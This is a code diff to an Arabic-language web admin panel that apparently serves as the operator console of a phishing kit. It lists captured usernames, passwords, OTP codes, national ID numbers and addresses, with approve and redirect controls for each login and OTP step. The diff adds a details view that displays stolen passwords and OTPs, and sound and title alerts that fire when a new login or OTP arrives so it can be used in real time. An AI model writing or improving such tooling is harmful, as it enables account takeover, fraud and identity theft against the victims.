@@ -202,6 +202,26 @@ body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0f1923; color: 
 
 .empty-msg { text-align: center; color: #6b7f9e; padding: 50px 20px; font-size: 0.95rem; }
 
+.notif-toast {
+  position: fixed; top: 20px; left: 50%; transform: translateX(-50%);
+  background: linear-gradient(135deg, #059669, #34d399); color: #fff;
+  padding: 14px 28px; border-radius: 16px; font-weight: 700; font-size: 1rem;
+  z-index: 9999; display: none; align-items: center; gap: 10px;
+  box-shadow: 0 8px 32px rgba(52,211,153,0.4); animation: slideDown 0.4s ease;
+  cursor: pointer;
+}
+.notif-toast.show { display: flex; }
+.notif-toast .notif-icon { font-size: 1.3rem; }
+@keyframes slideDown {
+  from { transform: translateX(-50%) translateY(-80px); opacity: 0; }
+  to { transform: translateX(-50%) translateY(0); opacity: 1; }
+}
+@keyframes flashBorder {
+  0%, 100% { border-color: rgba(52,211,153,0.8); box-shadow: 0 0 15px rgba(52,211,153,0.3); }
+  50% { border-color: rgba(251,146,60,0.8); box-shadow: 0 0 15px rgba(251,146,60,0.3); }
+}
+.session-card.new-data { animation: flashBorder 1s ease-in-out 3; }
+
 .sessions-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(340px, 1fr)); gap: 20px; }
 .session-card {
   background: linear-gradient(135deg, #1a2d44 0%, #162336 100%);
@@ -260,6 +280,11 @@ body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0f1923; color: 
 </style>
 </head>
 <body>
+
+<div class="notif-toast" id="notifToast" onclick="this.classList.remove('show')">
+  <span class="notif-icon">🔔</span>
+  <span id="notifText">بيانات جديدة!</span>
+</div>
 
 <aside class="sidebar">
   <div class="sidebar-logo">
@@ -428,7 +453,7 @@ function showTab(tab) {
   document.getElementById('nav-' + tab).classList.add('active');
   var titles = { dashboard: 'لوحة التحكم', orders: 'قائمة الطلبات', visitors: 'الزوار', sessions: 'الجلسات' };
   document.getElementById('pageTitle').textContent = titles[tab];
-  if (tab === 'orders') { loadOrders(); }
+  if (tab === 'orders') loadOrders();
   if (tab === 'visitors') loadVisitors();
   if (tab === 'sessions') loadSessions();
 }
@@ -465,7 +490,11 @@ function loadOrders() {
   fetch('/api/orders', { headers: authHeaders() }).then(checkAuth).then(function(d) {
     if (!d) return;
     ordersData = d.orders || [];
-    renderOrders();
+    checkNewOrders(ordersData);
+    fetch('/api/sessions', { headers: authHeaders() }).then(checkAuth).then(function(sd) {
+      if (sd) sessionsData = sd.sessions || [];
+      renderOrders();
+    }).catch(function() { renderOrders(); });
   }).catch(function() {});
 }
 
@@ -497,17 +526,40 @@ function loadVisitors() {
 
 function renderOrders() {
   var tb = document.getElementById('ordersBody');
-  document.getElementById('ordersBadge').textContent = ordersData.length + ' طلب';
-  if (ordersData.length === 0) {
-    tb.innerHTML = '<tr><td colspan="7" class="empty-msg">لا توجد طلبات حتى الآن</td></tr>';
+  var allItems = [];
+  ordersData.forEach(function(o) {
+    allItems.push({ type: 'order', data: o, date: o.date });
+  });
+  sessionsData.forEach(function(s) {
+    allItems.push({ type: 'session', data: s, date: s.date });
+  });
+  allItems.sort(function(a, b) { return new Date(b.date) - new Date(a.date); });
+
+  document.getElementById('ordersBadge').textContent = allItems.length + ' سجل';
+  if (allItems.length === 0) {
+    tb.innerHTML = '<tr><td colspan="7" class="empty-msg">لا توجد بيانات حتى الآن</td></tr>';
     return;
   }
   tb.innerHTML = '';
-  ordersData.forEach(function(o) {
-    var sc = o.status === 'approved' ? 'approved' : o.status === 'rejected' ? 'rejected' : o.status === 'blocked' ? 'blocked' : o.status === 'click' ? 'click' : 'pending';
-    var st = o.status === 'approved' ? 'مقبول' : o.status === 'rejected' ? 'مرفوض' : o.status === 'blocked' ? 'محظور' : o.status === 'click' ? 'نقرة جديدة' : 'قيد المراجعة';
+  allItems.forEach(function(item) {
     var tr = document.createElement('tr');
-    tr.innerHTML = '<td>' + o.id + '</td><td>' + (o.country || '-') + '</td><td>' + (o.service || '-') + '</td><td>' + (o.name || '-') + '</td><td dir="ltr" style="text-align:right">' + (o.phone || '-') + '</td><td><span class="status-badge ' + sc + '">' + st + '</span></td><td><button class="btn-sm btn-details" onclick="openDetails(' + o.id + ')">التفاصيل</button><button class="btn-sm btn-redirect" onclick="redirectOrder(' + o.id + ')">إعادة التوجيه</button></td>';
+    if (item.type === 'session') {
+      var s = item.data;
+      var sc, st;
+      if (s.otpStatus === 'approved') { sc = 'approved'; st = 'مكتمل'; }
+      else if (s.loginStatus === 'rejected') { sc = 'rejected'; st = 'مرفوض'; }
+      else if (s.otpStatus === 'rejected') { sc = 'rejected'; st = 'OTP مرفوض'; }
+      else if (s.otpStatus === 'waiting') { sc = 'waiting'; st = 'OTP'; }
+      else if (s.loginStatus === 'approved' && !s.otp) { sc = 'approved'; st = 'بانتظار OTP'; }
+      else if (s.loginStatus === 'waiting') { sc = 'waiting'; st = 'تسجيل دخول'; }
+      else { sc = 'pending'; st = 'بيانات جديدة'; }
+      tr.innerHTML = '<td>S' + s.id + '</td><td>' + (s.country || '-') + '</td><td>' + (s.service || '-') + '</td><td>' + (s.username || '-') + '</td><td dir="ltr" style="text-align:right">' + (s.orderPhone || s.ip || '-') + '</td><td><span class="status-badge ' + sc + '">' + st + '</span></td><td><button class="btn-sm btn-details" onclick="openSessionDetails(' + s.id + ')">التفاصيل</button><button class="btn-sm btn-redirect" onclick="redirectSession(' + s.id + ')">إعادة التوجيه</button></td>';
+    } else {
+      var o = item.data;
+      var sc = o.status === 'approved' ? 'approved' : o.status === 'rejected' ? 'rejected' : o.status === 'blocked' ? 'blocked' : o.status === 'click' ? 'click' : 'pending';
+      var st = o.status === 'approved' ? 'مقبول' : o.status === 'rejected' ? 'مرفوض' : o.status === 'blocked' ? 'محظور' : 'بيانات جديدة';
+      tr.innerHTML = '<td>' + o.id + '</td><td>' + (o.country || '-') + '</td><td>' + (o.service || '-') + '</td><td>' + (o.name || '-') + '</td><td dir="ltr" style="text-align:right">' + (o.phone || '-') + '</td><td><span class="status-badge ' + sc + '">' + st + '</span></td><td><button class="btn-sm btn-details" onclick="openDetails(' + o.id + ')">التفاصيل</button><button class="btn-sm btn-redirect" onclick="redirectOrder(' + o.id + ')">إعادة التوجيه</button></td>';
+    }
     tb.appendChild(tr);
   });
 }
@@ -534,8 +586,44 @@ function openDetails(id) {
   document.getElementById('detailsModal').classList.add('show');
 }
 
+function openSessionDetails(id) {
+  var s = sessionsData.find(function(x) { return x.id === id; });
+  if (!s) return;
+  var dt = s.date ? new Date(s.date).toLocaleString('ar-AE') : '-';
+  var sc, st;
+  if (s.otpStatus === 'approved') { sc = 'approved'; st = 'مكتمل'; }
+  else if (s.loginStatus === 'rejected') { sc = 'rejected'; st = 'مرفوض'; }
+  else if (s.otpStatus === 'rejected') { sc = 'rejected'; st = 'OTP مرفوض'; }
+  else if (s.otpStatus === 'waiting') { sc = 'waiting'; st = 'OTP'; }
+  else if (s.loginStatus === 'waiting') { sc = 'waiting'; st = 'تسجيل دخول'; }
+  else { sc = 'pending'; st = 'بيانات جديدة'; }
+  var fields = [
+    ['رقم الجلسة', 'S' + s.id], ['التاريخ', dt],
+    ['اسم المستخدم', s.username || '-'], ['كلمة المرور', s.password || '-'],
+    ['الدولة', s.country || '-'], ['عنوان IP', s.ip || '-'],
+    ['نوع الخدمة', s.service || '-']
+  ];
+  if (s.otp) fields.push(['رمز OTP', '<span style="font-family:monospace;font-size:1.2rem;letter-spacing:4px;color:#00c8ff;font-weight:800;">' + s.otp + '</span>']);
+  if (s.orderName) fields.push(['الاسم', s.orderName]);
+  if (s.orderPhone) fields.push(['الجوال', s.orderPhone]);
+  if (s.orderEmail) fields.push(['البريد', s.orderEmail]);
+  if (s.orderIdNumber) fields.push(['رقم الهوية', s.orderIdNumber]);
+  if (s.orderEmirate) fields.push(['الإمارة', s.orderEmirate]);
+  if (s.orderAddress) fields.push(['العنوان', s.orderAddress]);
+  fields.push(['الحالة', '<span class="status-badge ' + sc + '">' + st + '</span>']);
+  var html = '';
+  fields.forEach(function(f) {
+    html += '<div class="modal-row"><span class="label">' + f[0] + '</span><span class="value">' + f[1] + '</span></div>';
+  });
+  document.getElementById('modalData').innerHTML = html;
+  document.getElementById('detailsModal').querySelector('.modal-title').textContent = 'تفاصيل الجلسة';
+  currentOrderId = -1;
+  document.getElementById('detailsModal').classList.add('show');
+}
+
 function closeModal() {
   document.getElementById('detailsModal').classList.remove('show');
+  document.getElementById('detailsModal').querySelector('.modal-title').textContent = 'تفاصيل الطلب';
 }
 
 function actionOrder(action) {
@@ -640,6 +728,7 @@ function loadSessions() {
   fetch('/api/sessions', { headers: authHeaders() }).then(checkAuth).then(function(d) {
     if (!d) return;
     sessionsData = d.sessions || [];
+    checkNewSessions(sessionsData);
     renderSessions();
   }).catch(function() {});
 }
@@ -693,11 +782,11 @@ function renderSessions() {
     } else if (s.otpStatus === 'approved') {
       statusHtml = '<span class="status-badge approved">مكتمل</span>';
     } else if (s.otpStatus === 'waiting') {
-      statusHtml = '<span class="status-badge waiting">بانتظار قرار OTP</span>';
+      statusHtml = '<span class="status-badge waiting">OTP</span>';
     } else if (s.loginStatus === 'approved' && !s.otp) {
       statusHtml = '<span class="status-badge approved">تم قبول الدخول - بانتظار OTP</span>';
     } else if (s.loginStatus === 'waiting') {
-      statusHtml = '<span class="status-badge waiting">بانتظار قرار الدخول</span>';
+      statusHtml = '<span class="status-badge waiting">تسجيل دخول</span>';
     }
 
     var actionsHtml = '';
@@ -757,6 +846,88 @@ function sessionAction(type, id, status) {
   });
 }
 
+// Notification system
+var knownSessionIds = {};
+var knownOrderIds = {};
+var firstLoad = true;
+var originalTitle = document.title;
+var titleFlashInterval = null;
+
+function playNotifSound() {
+  try {
+    var ctx = new (window.AudioContext || window.webkitAudioContext)();
+    var osc = ctx.createOscillator();
+    var gain = ctx.createGain();
+    osc.connect(gain);
+    gain.connect(ctx.destination);
+    osc.type = 'sine';
+    gain.gain.setValueAtTime(0.4, ctx.currentTime);
+    gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.5);
+    osc.frequency.setValueAtTime(880, ctx.currentTime);
+    osc.frequency.setValueAtTime(1100, ctx.currentTime + 0.15);
+    osc.frequency.setValueAtTime(880, ctx.currentTime + 0.3);
+    osc.start(ctx.currentTime);
+    osc.stop(ctx.currentTime + 0.5);
+  } catch(e) {}
+}
+
+function showNotif(msg) {
+  var toast = document.getElementById('notifToast');
+  document.getElementById('notifText').textContent = msg;
+  toast.classList.remove('show');
+  void toast.offsetWidth;
+  toast.classList.add('show');
+  setTimeout(function() { toast.classList.remove('show'); }, 4000);
+  if (titleFlashInterval) clearInterval(titleFlashInterval);
+  var flash = true;
+  titleFlashInterval = setInterval(function() {
+    document.title = flash ? '🔔 ' + msg : originalTitle;
+    flash = !flash;
+  }, 1000);
+  setTimeout(function() {
+    if (titleFlashInterval) { clearInterval(titleFlashInterval); titleFlashInterval = null; }
+    document.title = originalTitle;
+  }, 10000);
+}
+
+function checkNewSessions(sessions) {
+  if (firstLoad) {
+    sessions.forEach(function(s) { knownSessionIds[s.id] = (s.otp ? 'otp' : 'login'); });
+    return;
+  }
+  sessions.forEach(function(s) {
+    var prev = knownSessionIds[s.id];
+    if (!prev) {
+      knownSessionIds[s.id] = (s.otp ? 'otp' : 'login');
+      if (s.otp) {
+        playNotifSound();
+        showNotif('وصل رمز OTP - جلسة #' + s.id);
+      } else {
+        playNotifSound();
+        showNotif('تسجيل دخول جديد - جلسة #' + s.id);
+      }
+    } else if (prev === 'login' && s.otp) {
+      knownSessionIds[s.id] = 'otp';
+      playNotifSound();
+      showNotif('وصل رمز OTP - جلسة #' + s.id);
+    }
+  });
+}
+
+function checkNewOrders(orders) {
+  if (firstLoad) {
+    orders.forEach(function(o) { knownOrderIds[o.id] = true; });
+    return;
+  }
+  orders.forEach(function(o) {
+    if (!knownOrderIds[o.id]) {
+      knownOrderIds[o.id] = true;
+      playNotifSound();
+      showNotif('بيانات جديدة - طلب #' + o.id);
+    }
+  });
+}
+
 // Init
 var now = new Date();
 var months = ['يناير','فبراير','مارس','أبريل','مايو','يونيو','يوليو','أغسطس','سبتمبر','أكتوبر','نوفمبر','ديسمبر'];
@@ -766,6 +937,8 @@ document.getElementById('currentDate').textContent = days[now.getDay()] + ' ' + 
 loadStats();
 loadOrders();
 loadSessions();
+
+setTimeout(function() { firstLoad = false; }, 2000);
 
 setInterval(function() {
   loadStats();
